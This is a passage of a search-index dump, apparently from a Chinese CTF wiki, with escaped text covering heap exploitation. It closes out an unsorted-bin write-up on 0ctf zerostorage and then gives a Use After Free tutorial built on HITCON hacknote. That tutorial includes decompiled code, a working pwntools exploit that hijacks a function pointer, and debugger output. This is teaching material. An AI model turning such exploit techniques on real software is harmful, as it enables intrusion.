\u6700\u540e\u5b58\u50a8merge_from\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u88ab\u91ca\u653e\u4e86\uff0c\u4f46\u5e76\u6ca1\u6709\u88ab\u7f6e\u4e3aNULL\u3002\u540c\u65f6\uff0c\u5b58\u653emerge_to\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u5e76\u6ca1\u6709\u88ab\u91ca\u653e\uff0c\u76f8\u5e94\u7684storage\u7684\u6291\u6216\u540e\u7684\u5730\u5740\u53ea\u662f\u88ab\u7f6e\u4e3a\u4e86NULL\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u5728merge\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u4e24\u4e2astorage\u7684ID\u662f\u5426\u76f8\u540c\u3002","title":"merge-3"},{"location":"pwn/heap/unsorted_bin_attack/#delete-4","text":"\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c storage \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002 \u4e4b\u540e\u5c31\u662f\u5c06\u5143\u7d20\u5bf9\u5e94\u7684\u5b57\u6bb5\u5206\u522b\u8bbe\u7f6e\u4e3aNULL\uff0c\u5e76\u4e14\u91ca\u653e\u5bf9\u5e94\u7684\u5185\u5b58\u3002","title":"delete-4"},{"location":"pwn/heap/unsorted_bin_attack/#view-5","text":"\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c storage \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002 \u8f93\u5165\u5bf9\u5e94\u7684storage \u7684\u5185\u5bb9\u3002","title":"view-5"},{"location":"pwn/heap/unsorted_bin_attack/#list-6","text":"\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002 \u904d\u5386\u6240\u6709\u6b63\u5728\u4f7f\u7528\u7684storage\uff0c\u8f93\u5165\u5176\u5bf9\u5e94\u7684\u4e0b\u6807\u4ee5\u53ca\u5bf9\u5e94storage\u7684\u5927\u5c0f\u3002","title":"list-6"},{"location":"pwn/heap/unsorted_bin_attack/#_10","text":"\u901a\u8fc7\u8fd9\u4e48\u7b80\u5355\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5 \u57fa\u672c\u786e\u5b9a\u6f0f\u6d1e\u4e3b\u8981\u5c31\u662f\u96c6\u4e2d\u5728insert\u64cd\u4f5c\u4e0emerge\u64cd\u4f5c\u4e2d\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eecmerge\u4e24\u4e2a\u8f83\u5c0fsize\u7684storage\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002 \u6211\u4eec\u6765\u5177\u4f53\u5206\u6790\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5728insert\u8fc7\u7a0b\u4e2d\u63d2\u5165\u8f83\u5c0f\u7684size\uff08\u6bd4\u59828\uff09\u7684storage A\uff0c\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u8fdb\u884cmerge\u65f6\uff0c\u5047\u8bbe\u6211\u4eec\u9009\u62e9merge\u7684\u4e24\u4e2astorage \u90fd\u4e3aA\uff0c\u90a3\u4e48\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u628a\u5c31\u4f1a\u76f4\u63a5\u628aA\u7684\u5185\u5bb9\u518d\u6dfb\u52a0\u5230A\u7684\u539f\u6709\u5185\u5bb9\u7684\u540e\u9762\uff0c\u7136\u540e\u63a5\u7740\u5c31\u4f1a\u628aA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5185\u5b58free\u6389\uff0c\u4f46\u662f\u8fd9\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u56e0\u4e3aA\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u88ab\u8d4b\u7ed9\u4e86\u53e6\u5916\u4e00\u4e2astorage\uff0c\u5f53\u518d\u8bbf\u95eemerge \u540e\u7684 storage B\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u7531\u4e8eB\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5730\u5740\u5176\u5b9e\u5c31\u662fA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6253\u5370\u7684\u5c31\u662fA\u7684\u6570\u636e\u90e8\u5206\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u521a\u521a\u628aA\u5bf9\u5e94\u7684\u5185\u5b58\u91ca\u653e\u6389\uff0c\u800cA\u7531\u4e8e\u4e0d\u5728fast bin\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u53ea\u4f1a\u88ab\u653e\u5230unsorted bin\u4e2d\uff08\u800c\u4e14\u6b64\u65f6\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6240\u4ee5\u6b64\u65f6A\u7684fd\u548cbk\u90fd\u5b58\u653e\u7684\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002 \u5982\u679c\u6211\u4eec\u5728merge\u4e4b\u524d\u66fe\u7ecf\u5220\u9664\u8fc7\u4e00\u4e2astorage C\uff0c\u90a3\u4e48\u5728\u6211\u4eecmerge A\u540e\uff0cA\u5c31\u4f1a\u63d2\u5728unsorted bin\u7684\u53cc\u5411\u94fe\u8868\u7684\u9996\u90e8\uff0c\u6240\u4ee5\u5176fd\u5219\u662fC\u5bf9\u5e94\u7684\u5730\u5740\uff0cbk\u5219\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\u3002 \u800c\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u53bb\u4fee\u6539merge\u540e\u7684B\u7684\u5185\u5bb9\u7684\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e2aUse After Free\u3002","title":"\u6f0f\u6d1e\u786e\u5b9a"},{"location":"pwn/heap/unsorted_bin_attack/#_11","text":"\u3002\u3002\u3002\u3002","title":"\u5229\u7528\u6d41\u7a0b"},{"location":"pwn/heap/unsorted_bin_attack/#_12","text":"","title":"\u9898\u76ee"},{"location":"pwn/heap/unsorted_bin_attack/#_13","text":"http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/ https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py","title":"\u53c2\u8003\u6587\u732e"},{"location":"pwn/heap/use_after_free/","text":"Use After Free \u00b6 \u539f\u7406 \u00b6 \u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48 \u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c \u3002 \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c \u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898 \u3002 \u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684 Use After Free \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c \u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\u7684\u5185\u5b58\u6307\u9488\u4e3adangling pointer\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50 #include <stdio.h> #include <stdlib.h> typedef struct name { char * myname ; void ( * func )( char * str ); } NAME ; void myprint ( char * str ) { printf ( \"%s \\n \" , str ); } void printmyname () { printf ( \"call print my name \\n \" ); } int main () { NAME * a ; a = ( NAME * ) malloc ( sizeof ( struct name )); a -> func = myprint ; a -> myname = \"I can also use it\" ; a -> func ( \"this is my function\" ); // free without modify free ( a ); a -> func ( \"I can also use it\" ); // free with modify a -> func = printmyname ; a -> func ( \"this is my function\" ); // set NULL a = NULL ; printf ( \"this pogram will crash... \\n \" ); a -> func ( \"can not be printed...\" ); } \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c use_after_free git: ( use_after_free ) \u2717 ./use_after_free this is my function I can also use it call print my name this pogram will crash... [ 1 ] 38738 segmentation fault ( core dumped ) ./use_after_free \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote\u4e3a\u4f8b\u3002 \u529f\u80fd\u5206\u6790 \u00b6 \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2amenu\u51fd\u6570\uff0c\u5176\u4e2d\u6709 puts ( \" 1. Add note \" ); puts ( \" 2. Delete note \" ); puts ( \" 3. Print note \" ); puts ( \" 4. Exit \" ); \u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u67093\u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002 add_note \u00b6 \u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a05\u4e2anote\u3002\u6bcf\u4e2anote\u6709\u4e24\u4e2a\u5b57\u6bb5put\u4e0econtent\uff0c\u5176\u4e2dput\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002 unsigned int add_note () { note * v0 ; // ebx signed int i ; // [esp+Ch] [ebp-1Ch] int size ; // [esp+10h] [ebp-18h] char buf ; // [esp+14h] [ebp-14h] unsigned int v5 ; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword ( 0x14u ); if ( count <= 5 ) { for ( i = 0 ; i <= 4 ; ++ i ) { if ( ! notelist [ i ] ) { notelist [ i ] = malloc ( 8u ); if ( ! notelist [ i ] ) { puts ( \"Alloca Error\" ); exit ( - 1 ); } notelist [ i ] -> put = print_note_content ; printf ( \"Note size :\" ); read ( 0 , & buf , 8u ); size = atoi ( & buf ); v0 = notelist [ i ]; v0 -> content = malloc ( size ); if ( ! notelist [ i ] -> content ) { puts ( \"Alloca Error\" ); exit ( - 1 ); } printf ( \"Content :\" ); read ( 0 , notelist [ i ] -> content , size ); puts ( \"Success !\" ); ++ count ; return __readgsdword ( 0x14u ) ^ v5 ; } } } else { puts ( \"Full\" ); } return __readgsdword ( 0x14u ) ^ v5 ; } print_note \u00b6 print_note\u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684note\u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684note\u7684\u5185\u5bb9\u3002 unsigned int print_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) notelist [ v1 ] -> put ( notelist [ v1 ]); return __readgsdword ( 0x14u ) ^ v3 ; } delete_note \u00b6 delete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728Use After Free\u7684\u60c5\u51b5\u7684\u3002 unsigned int del_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) { free ( notelist [ v1 ] -> content ); free ( notelist [ v1 ]); puts ( \"Success\" ); } return __readgsdword ( 0x14u ) ^ v3 ; } \u5229\u7528\u5206\u6790 \u00b6 \u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2amagic\u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884cmagic\u51fd\u6570\u5462\uff1f \u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539note\u7684put\u5b57\u6bb5\u4e3amagic\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884cprint note \u7684\u65f6\u5019\u6267\u884cmagic\u51fd\u6570\u3002 \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2anote\u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b \u7a0b\u5e8f\u7533\u8bf78\u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653enote\u4e2d\u7684put\u4ee5\u53cacontent\u6307\u9488\u3002 \u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684size\u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8content\u3002 +-----------------+ | put | +-----------------+ | content | size +-----------------+------------------->+----------------+ | real | | content | | | +----------------+ \u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136note\u662f\u4e00\u4e2afastbin chunk\uff08\u5927\u5c0f\u4e3a16\u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2anote\u7684put\u5b57\u6bb5\u4e3amagic\u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2anote\u7684put\u6307\u9488\u88ab\u8986\u76d6\u4e3amagic\u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9put\u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199real content\u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b \u7533\u8bf7note0\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u7533\u8bf7note1\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u91ca\u653enote0 \u91ca\u653enote1 \u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a16\u7684fast bin chunk\u4e2d\u94fe\u8868\u4e3anote1->note0 \u7533\u8bf7note2\uff0c\u5e76\u4e14\u8bbe\u7f6ereal content\u7684\u5927\u5c0f\u4e3a8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219 note2\u5176\u5b9e\u4f1a\u5206\u914dnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002 real content \u5bf9\u5e94\u7684chunk\u5176\u5b9e\u662fnote0\u3002 \u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411note3\u7684chunk\u90e8\u5206\u5199\u5165magic\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709note1\u4e3aNULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fanote1\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528magic\u51fd\u6570\u3002 \u5229\u7528\u811a\u672c \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './hacknote' ) def addnote ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def delnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def printnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) #gdb.attach(r) magic = 0x08048986 addnote ( 32 , \"aaaa\" ) # add note 0 addnote ( 32 , \"ddaa\" ) # add note 1 delnote ( 0 ) # delete note 0 delnote ( 1 ) # delete note 1 addnote ( 8 , p32 ( magic )) # add note 2 printnote ( 0 ) # print note 0 r . interactive () \u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9 \u4e24\u5904malloc\u4e0b\u65ad\u70b9 gef\u27a4 b *0x0804875C Breakpoint 1 at 0x804875c gef\u27a4 b *0x080486CA Breakpoint 2 at 0x80486ca \u4e24\u5904free\u4e0b\u65ad\u70b9 gef\u27a4 b *0x08048893 Breakpoint 3 at 0x8048893 gef\u27a4 b *0x080488A9 Breakpoint 4 at 0x80488a9 \u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7note0\u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a0x0804b008\u3002\uff08eax\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 < add_note + 89 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x80486c2 < add_note + 76 > add DWORD PTR [ eax ], eax 0 x80486c4 < add_note + 78 > add BYTE PTR [ ebx + 0x86a0cec ], al 0 x80486ca < add_note + 84 > call 0x80484e0 < malloc@plt > \u2192 0 x80486cf < add_note + 89 > add esp , 0x10 0 x80486d2 < add_note + 92 > mov edx , eax 0 x80486d4 < add_note + 94 > mov eax , DWORD PTR [ ebp-0x1c ] 0 x80486d7 < add_note + 97 > mov DWORD PTR [ eax * 4 + 0x804a070 ], edx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf10 ' , ' l8 ' ] 8 0 xffffcf10 \u2502+ 0x00 : 0x00000008 \u2190 $esp 0 xffffcf14 \u2502+ 0x04 : 0x00000000 0 xffffcf18 \u2502+ 0x08 : 0xf7e29ef5 \u2192 < strtol + 5 > add eax , 0x18210b 0 xffffcf1c \u2502+ 0x0c : 0xf7e27260 \u2192 < atoi + 16 > add esp , 0x1c 0 xffffcf20 \u2502+ 0x10 : 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0 xffffcf24 \u2502+ 0x14 : 0x00000000 0 xffffcf28 \u2502+ 0x18 : 0x0000000a 0 xffffcf2c \u2502+ 0x1c : 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 --- Type < return > to continue , or q < return > to quit--- [ #0] 0x80486cf \u2192 Name: add_note() [ #1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 heap chunk 0x0804b008 UsedChunk ( addr = 0x804b008 , size = 0x10 ) Chunk size : 16 ( 0x10 ) Usable size : 12 ( 0xc ) Previous chunk size : 0 ( 0x0 ) PREV_INUSE flag : On IS_MMAPPED flag : Off NON_MAIN_ARENA flag : Off \u7533\u8bf7note 0\u7684content\u7684\u5730\u5740\u4e3a0x0804b018 $eax : 0x0804b018 \u2192 